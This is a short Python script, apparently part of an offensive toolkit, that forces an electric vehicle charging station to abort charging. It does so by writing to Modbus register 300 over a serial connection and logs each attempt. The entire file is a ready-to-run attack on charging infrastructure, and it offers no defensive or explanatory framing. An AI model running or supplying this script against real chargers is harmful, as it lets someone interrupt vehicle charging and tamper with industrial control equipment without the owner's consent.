#!/usr/bin/env python3
# modules/attacks/vehicle_charger_abort.py

import minimalmodbus
import argparse
import time
import os

LOG = "results/charger_abort.log"
MODBUS_PORT = "/dev/ttyUSB0"
MODBUS_ADDR = 2
REGISTER_ABORT = 300

def log(msg):
    os.makedirs("results", exist_ok=True)
    with open(LOG, "a") as f:
        f.write(f"{time.ctime()} | {msg}\n")
    print(msg)

def send_abort():
    try:
        inst = minimalmodbus.Instrument(MODBUS_PORT, MODBUS_ADDR)
        inst.serial.baudrate = 9600
        inst.write_register(REGISTER_ABORT, 1)
        log("Sent EV charging abort signal")
    except Exception as e:
        log(f"[ERROR] Charger command failed: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Force abort on electric vehicle charging station via Modbus")
    args = parser.parse_args()
    send_abort()
